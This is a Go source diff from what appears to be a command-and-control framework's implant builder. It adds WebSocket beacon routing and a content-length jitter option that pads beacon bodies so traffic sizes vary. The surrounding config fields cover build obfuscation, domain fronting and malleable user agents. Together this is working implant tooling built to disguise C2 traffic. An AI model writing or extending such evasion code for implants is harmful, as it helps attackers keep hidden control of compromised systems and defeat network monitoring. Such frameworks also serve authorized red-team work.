@@ -302,11 +302,21 @@ func resolveGarbleCmd() string {
 
 const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
+const (
+	// HTTP/HTTPS beacon endpoint (POST route registered in routes.go).
+	defaultBeaconURI = "/api/v1/beacon"
+	// WebSocket beacon endpoint (GET route registered in routes.go). The
+	// server upgrades ONLY this path for beacon WebSockets, so a WSS build
+	// must never keep the plain HTTP URI: the WS handshake would fail and
+	// the agent would silently downgrade to HTTPS POST.
+	defaultWSBeaconURI = "/ws/beacon"
+)
+
 func defaultMalleableProfile() MalleableProfile {
 	return MalleableProfile{
 		Name:      "default",
 		UserAgent: defaultWindowsUA,
-		BeaconURI: "/api/v1/beacon",
+		BeaconURI: defaultBeaconURI,
 		Method:    "POST",
 		Headers:   map[string]string{"Accept": "*/*"},
 		Sleep:     10,
@@ -340,7 +350,7 @@ func parseMalleableProfileJSON(data []byte, fallbackName string) MalleableProfil
 		p.Name = fallbackName
 	}
 	if p.BeaconURI == "" {
-		p.BeaconURI = "/api/v1/beacon"
+		p.BeaconURI = defaultBeaconURI
 	}
 	if p.Method == "" {
 		p.Method = "POST"
@@ -383,6 +393,14 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	profile := loadMalleableProfile(cfg.Profile, dataDir)
 	cfg.BeaconURI = profile.BeaconURI
 	cfg.Method = profile.Method
+	// WebSocket builds must hit the server's WS upgrade path: the HTTP beacon
+	// route is never upgraded, so a WSS build that keeps the default HTTP URI
+	// would fail every handshake and silently slide back to HTTPS POST. Map
+	// the default here (agent-side aliasing covers config_push overrides);
+	// profiles that explicitly set a custom beacon_uri are honored as-is.
+	if cfg.BeaconTransport == "wss" && (cfg.BeaconURI == "" || cfg.BeaconURI == defaultBeaconURI) {
+		cfg.BeaconURI = defaultWSBeaconURI
+	}
 	// Carry the malleable response wrapping (prepend/append) into the config
 	// blob so the agent can strip it on HTTP replies. Explicit per-build
 	// values win over the profile file.
@@ -431,6 +449,15 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 		cfg.UserAgent = profile.UserAgent
 	} else {
 		cfg.UserAgent = defaultWindowsUA
+	}
+	// Body-length jitter is bounded so the padded frame can never trip the
+	// server's raw-body size guards (padding is stripped before envelope
+	// decode, but the transport-level limit is checked on the raw bytes).
+	if cfg.ContentLengthJitter < 0 {
+		cfg.ContentLengthJitter = 0
+	}
+	if cfg.ContentLengthJitter > 4096 {
+		cfg.ContentLengthJitter = 4096
 	}
 	return profile
 }
@@ -657,6 +684,10 @@ type ImplantConfig struct {
 	Obfuscate               bool   // Enable garble build-time obfuscation (string/literal hiding)
 	DomainFront             string // CDN front domain for domain fronting ("" = disabled)
 	Architecture            string // "amd64" (default), "arm64", "arm"
+	// Max random bytes appended to the HTTP/WS beacon body so the on-wire
+	// body length varies per beacon (0=disabled). The server strips the
+	// 8-byte length prefix on inbound; see stripBodyPadding/padBeaconBody.
+	ContentLengthJitter int
 	// Working hours
 	WorkingStart string // HH:MM start of working hours (empty = disabled)
 	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
